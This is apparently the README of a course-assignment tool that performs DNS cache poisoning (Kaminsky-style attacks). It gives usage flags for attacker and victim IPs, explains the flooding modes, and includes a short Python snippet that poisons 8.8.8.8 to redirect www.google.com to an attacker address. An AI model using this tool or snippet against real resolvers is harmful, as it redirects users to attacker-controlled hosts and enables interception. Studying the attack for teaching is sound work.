# DNS Poisoning Tool
A tool to perform DNS cache poisoning against vulnerable server.

![Image](docs/dnspoisoning_screen_2.png)

Both attack methodology is widely described here: [Kaminsky Attack](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html)

A detailed software documentation can be found [here](https://gr3yc4t.github.io/dns-poisoning-tool/html/annotated.html)

**WARNING**: This code is intended to be used only in the context of a particular assignment. If you want to reuse some of the functionalities refer to the [modules section](#modules). 

**NOTE**: When used to test homework result the **FAST** mode is mandatory since otherwise packets are transmitted too slowly causing the attack to fail.

## Requirements
* Scapy (For packet crafting) `pip3 install scapy`
* Blessing (For coloured terminal) `pip3 install blessings`
* DNS Python (For initial DNS query)  `pip3 install dnspython`

Inline requirements installation command pip install:

```pip3 install scapy blessings dnspython```

Otherwise simply use the provided requirements file

```pip3 install -r requirements.txt```

## Usage
The files ```launch.sh``` and ```launch_fast.sh``` can be edited with all the necessary paramters to carry on the attack or, instead, you could use the command line parameter directly.

```
usage: main.py [-h] -t DOMAIN -a ATTACKER_IP -v VICTIM_DNS_IP
               [-bs BAD_SERVER_IP] [-bp BAD_SERVER_PORT] -bd BAD_DOMAIN
               [-ns NS_SERVER] [-i INTERFACE] [-at {NORMAL,DAN}]
               [-m {NORMAL,FAST}] [-vm VICTIM_MAC] [-si SECRET_IP]
               [-sp SECRET_PORT] [-n NUM_ATTACK] [-nc] [-vb {1,2,3,4}]

                        Verbosity level
 ```
## Features
The tool support two version of the attack that can be specified with the related parameter
* Classical poisoning ([Shenanigans Version 1](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html#shenanigansv1))
* Dan's Shenanigans ([Dan's Version](http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html#shenanigansv2))

In addition two modes are available for flooding
* **Normal Flooding** - which uses IP layer
* **Faster Flooding** - which uses Ethernet layer

When "*faster flooding*" is used, both victim MAC Address and a network interface must be supplied.

The secret is printed both on the terminal output and in ```log_secret.txt``` file. 

### <a id="modules"></a> Modules
The code is developed in a modular way in order to be implemented in other tools. An extensive class documentation can be found [here](https://gr3yc4t.github.io/dns-poisoning-tool/html/annotated.html).
For example the following code starts a flood of DNS crafted response against the server at "8.8.8.8" in order to spoof the google domain and redirect users to the attacker IP (66.66.66.66):
```python 
import DNSPoisoning

poisoning = DNSPoisoning('8.8.8.8', 'www.google.com', '66.66.66.66')
poisoning.start_flooding()
```

### Bugs
When runninng in faster mode, a single CTRL+C signal is not sufficient to stop the execution due to some thread/signal handler bug. Therefore to completely stop the tool is required to hold CTRL+C for few seconds until the terminate the application.
